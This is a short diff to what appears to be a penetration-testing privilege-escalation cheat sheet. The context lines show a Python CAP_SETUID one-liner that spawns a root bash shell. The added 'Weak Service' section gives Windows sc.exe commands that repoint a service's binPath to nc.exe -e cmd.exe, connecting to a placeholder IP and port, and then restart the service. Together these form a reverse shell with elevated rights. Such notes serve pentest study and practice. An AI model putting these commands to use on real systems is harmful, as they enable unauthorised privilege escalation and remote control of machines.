@@ -337,6 +337,14 @@ CAP_SETUID
 $ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
+- Weak Service
+
+```
+C:\> sc.exe config <service> binPath=C:\Windows\Temp\nc.exe -e cmd.exe <IP address> <port>"
+C:\> sc.exe stop <service>
+C:\> sc.exe start <service>
+```
+
 #5. - Brute Force
 -----------------------------------------
 
